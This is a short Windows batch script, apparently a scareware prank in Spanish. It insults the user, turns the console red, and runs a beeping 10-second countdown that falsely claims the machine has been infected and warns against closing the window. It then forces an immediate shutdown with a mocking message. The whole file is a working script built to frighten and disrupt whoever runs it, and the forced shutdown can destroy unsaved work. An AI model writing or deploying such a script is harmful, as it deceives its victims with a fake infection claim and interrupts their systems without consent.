@echo off
color 04
cls

echo llamamaste pendejo

for /L %%i in (10,-1,1) do (
    :: Reproduce un pitido de 1000 Hz durante 300 milisegundos en cada segundo del conteo
    powershell -c "[console]::beep(1000, 300)"
    
    cls
    echo ========================================================
    echo             UHHHHH, TE INFECTO, TE INFECTO
    echo ========================================================
    echo.
    echo      EL DISPOSITIVO SE APAGARA EN: %%i segundos...
    echo      ¡NO INTENTES CERRAR ESTA VENTANA!
    echo.
    timeout /t 1 /nobreak >nul
)

cls
color 0c
:: Pitido final más agudo y largo justo antes de apagar
powershell -c "[console]::beep(2500, 800)"
echo ========================================================
echo             GOOD BYE
echo ========================================================
timeout /t 1 /nobreak >nul

shutdown /s /t 0 /c "El equipo se apagara porque te jakie estupido"